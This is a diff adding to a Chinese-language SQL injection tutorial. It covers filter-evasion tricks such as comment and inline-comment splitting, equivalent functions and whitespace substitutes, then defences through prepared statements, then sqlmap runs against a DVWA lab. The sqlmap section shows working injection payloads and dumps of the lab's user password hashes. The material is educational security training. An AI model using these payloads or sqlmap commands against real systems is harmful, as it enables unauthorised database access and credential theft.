@@ -683,29 +683,317 @@ z.com/index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4
 
 1. URL 编码
 
+2. 十六进制编码
+3. Unicode 编码
+
+### 使用注释
+
+常见的注释符号：`-- `， `/**/`， `#`， `-- -`
+
+1. 普通注释
+
+假设我们注入 `select 1` 这样的语句，会被正则匹配并且删除掉
+
+但是假设我们注入 `select1`，则又会报错。
+
+但我们可以注入 `select/**/1`，那么会成功注入
+
+```sql
+mysql> select 1;
++---+
+| 1 |
++---+
+| 1 |
++---+
+1 row in set (0.00 sec)
+
+mysql> select1;
+ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'select1' at line 1
+
+mysql> select/**/1;
++---+
+| 1 |
++---+
+| 1 |
++---+
+1 row in set (0.00 sec)
+```
+
+2. 内联注释
+
+内联注释是 MySQL 的一个特性，可以在注释中执行命令，语法为：`/*!COMMAND*/`
+
+```sql
+mysql> select 1 /*!union*/ select 2;
++---+
+| 1 |
++---+
+| 1 |
+| 2 |
++---+
+2 rows in set (0.00 sec)
+```
+
+### 等价函数与命令
+
+使用等价函数或者符号替换。
+
+函数或变量
+
+1. `ascii()` 替换
+   1.  `bin()` 二进制
+   2. `hex()` 十六进制
+2. `sleep()` 替换
+   1. `benchmark(count, expr)`  重复计算 expr 表达式 count 次
+3. `group_concat()` 替换
+   1. `concat_ws()` 多个列的字段合并
+4. `substr()` 替换
+   1. `substring()`
+   2. `mid()` 获取字符串的一部分
+
+符号
+
+1. `and` 🟰 `&&`
+2. `or` 🟰 `||`
+3. 空格 🟰`%20`， `%09`， `%0a`， `%0b`， `%0c` ，`%0d`， `%a0`， `/**/`
 
 
 
+### 特殊符号
+
+1. 反引号，例如
+
+```sql
+mysql> select first_name from`users`;
++------------+
+| first_name |
++------------+
+| admin      |
+| Gordon     |
+| Hack       |
+| Pablo      |
+| Bob        |
++------------+
+5 rows in set (0.00 sec)
+```
+
+2. `-`，`+`，`.` 符号
+
+```sql
+mysql> select+user_id-1+1.from users;
++---------------+
+| +user_id-1+1. |
++---------------+
+|             1 |
+|             2 |
+|             3 |
+|             4 |
+|             5 |
++---------------+
+5 rows in set (0.01 sec)
+```
+
+> 😨 为什么这条语句“select+user_id-1+1.from users;”在 MySQL 中可以执行成功？
+>
+> 🤖 这条语句在第一眼看上去似乎是不合法的，但实际上，它利用了 MySQL 的某些语法规则和解析方式。让我们逐步分解这条语句：
+>
+> 1. **`select+user_id-1+1.from users;`** - 在这里，MySQL 会解析 `+` 为算数运算符。所以 `select+user_id` 被解析为选择 `user_id` 列。
+> 2. **`-1+1`** - 这是一个简单的算数表达式，它的结果是0。
+> 3. **`.from`** - 这是关键的部分。虽然在常规 SQL 语法中，我们不会这样写，但这里的点号 (`.`) 被解析为一个小数点，所以 `1.from` 被解析为 `1.0`。紧跟在后面的 `from` 是正常的 SQL 关键字，用于指定从哪个表中选择数据。
+>
+> 综上所述，整个语句的意思是从 `users` 表中选择 `user_id` 列，并对每个 `user_id` 值减去 1 然后再加 1，结果仍为 `user_id`。
+
+3. `@` 符号，例如
+
+```sql
+mysql> select@^1.from users;
++------+
+| @^1. |
++------+
+| NULL |
+| NULL |
+| NULL |
+| NULL |
+| NULL |
++------+
+5 rows in set (0.00 sec)
+```
+
+4. MySQL 的 function 可以不用空格：
+
+```sql
+mysql> select-count(user_id)test from users;
++------+
+| test |
++------+
+|   -5 |
++------+
+1 row in set (0.00 sec)
+```
+
+## 防御
+
+### 预编译
+
+SQL 注入原因还是因为存在字符串并进行语法分析，执行语句。而通过预编译：
+
+```java
+String sql = "select id, num from user where id=?";    //定义SQL语句
+      PreparedStatement ps = conn.prepareStatement(sql);
+      ps.setInt(1,id);     //设置变量
+      ps.executeQuery();    //执行
+```
+
+让 SQl 引擎预编译好语法，语法已经确定，那么填充进来的参数就只是一个值，不会再进行语法分析，这是防御 SQL 注入最有效的方式。
+
+### 安全函数
+
+无法使用预编译的场景下，可以使用安全函数来校验参数的类型：
+
+```java
+MySQLCodec codec = new MySQLCodec(Mode.STANDARD);
+name = ESAPI.encoder().encodeForSQL(codec,name);
+String sql = "select id,no from user where name=" + name;
+```
+
+## 渗透测试工具 SQLMap
+
+🏠 官网：[https://sqlmap.org/](https://sqlmap.org/)
+
+### 安装
+
+Linux/MacOS  下安装 SQLMap：
+
+1. 将项目克隆到本地文件夹 
+
+```bash
+git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
+```
+
+2. 进入到文件夹 `sqlmap-dev` 中，执行更新
+
+```bash
+python3 sqlmap.py --update
+```
+
+3. 查看帮助信息
+
+```bash
+python3 sqlmap.py -hh
+```
+
+### 简介
+
+🧨 **sqlmap** 是一个开源的渗透测试工具，它自动化了检测和利用 SQL 注入漏洞以及接管数据库服务器的过程。
+
+支持的数据库有：*MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase, SAP MaxDB, Informix, MariaDB, MemSQL, TiDB, CockroachDB, HSQLDB, H2, MonetDB, Apache Derby, Amazon Redshift, Vertica, Mckoi, Presto, Altibase, MimerSQL, CrateDB, Greenplum, Drizzle, Apache Ignite, Cubrid, InterSystems Cache, IRIS, eXtremeDB, FrontBase, Raima Database Manager, YugabyteDB, ClickHouse and Virtuoso*
+
+🫱 更多见官网介绍
 
 
 
+### 基本使用
+
+对 DVWA 靶场进行扫描：`python3 sqlmap.py -u "http://YOUR_IP_ADDRESS:8080/vulnerabilities/sqli?id=123&Submit=Submit#" --cookie="PHPSESSID=98vc49t5lips67c82cp3glpft4; security=low"  --batch`
+
+扫描结果：
+```bash
+sqlmap identified the following injection point(s) with a total of 151 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: id=123' OR NOT 1015=1015#&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=123' AND (SELECT 8471 FROM(SELECT COUNT(*),CONCAT(0x716a767171,(SELECT (ELT(8471=8471,1))),0x7170626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- mKpW&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=123' AND (SELECT 2021 FROM (SELECT(SLEEP(5)))dEdm)-- KgwR&Submit=Submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=123' UNION ALL SELECT CONCAT(0x716a767171,0x68756a4a675242784f43596a4d505a4e7243436551716275536c646c535a64534354787044637977,0x7170626271),NULL#&Submit=Submit
+---
+[19:30:35] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian 8 (jessie)
+web application technology: Apache 2.4.10
+back-end DBMS: MySQL >= 5.0
+```
 
 
 
+### 进阶使用
 
+1. 获取库：`python3 sqlmap.py -u "http://YOUR_ADDRESS:8080/vulnerabilities/sqli?id=123&Submit=Submit#" --cookie="PHPSESSID=98vc49t5lips67c82cp3glpft4; security=low"  --batch --dbs`
 
+```
+...
+[09:23:51] [INFO] fetching database names
+available databases [4]:
+[*] dvwa
+[*] information_schema
+[*] mysql
+[*] performance_schema
+...
+```
 
+2. 获取表：`python3 sqlmap.py -u "http://YOUR_ADDRESS:8080/vulnerabilities/sqli?id=123&Submit=Submit#" --cookie="PHPSESSID=98vc49t5lips67c82cp3glpft4; security=low"  --batch -D dvwa --tables`
 
+```
+...
+Database: dvwa
+[2 tables]
++-----------+
+| guestbook |
+| users     |
++-----------+
+...
+```
 
+3. 获取表的字段：`python3 sqlmap.py -u "http://YOUR_ADDRESS:8080/vulnerabilities/sqli?id=123&Submit=Submit#" --cookie="PHPSESSID=98vc49t5lips67c82cp3glpft4; security=low"  --batch -D dvwa -T users --co
+   lumns`
 
+```
+...
+Database: dvwa
+Table: users
+[8 columns]
++--------------+-------------+
+| Column       | Type        |
++--------------+-------------+
+| user         | varchar(15) |
+| avatar       | varchar(70) |
+| failed_login | int(3)      |
+| first_name   | varchar(15) |
+| last_login   | timestamp   |
+| last_name    | varchar(15) |
+| password     | varchar(32) |
+| user_id      | int(6)      |
++--------------+-------------+
+...
+```
 
+3. 获取表中指定字段的值：` python3 sqlmap.py -u "http://YOUR_ADDRESS:8080/vulnerabilities/sqli?id=123&Submit=Submit#" --cookie="PHPSESSID=98vc49t5lips67c82cp3glpft4; security=low"  --batch -D dvwa -T users -C user,password --dump`
 
-
-
-
-
-
-
+```
+...
+Database: dvwa
+Table: users
+[5 entries]
++---------+---------------------------------------------+
+| user    | password                                    |
++---------+---------------------------------------------+
+| admin   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
+| gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   |
+| 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  |
+| pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  |
+| smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
++---------+---------------------------------------------+
+...
+```
 
 
 
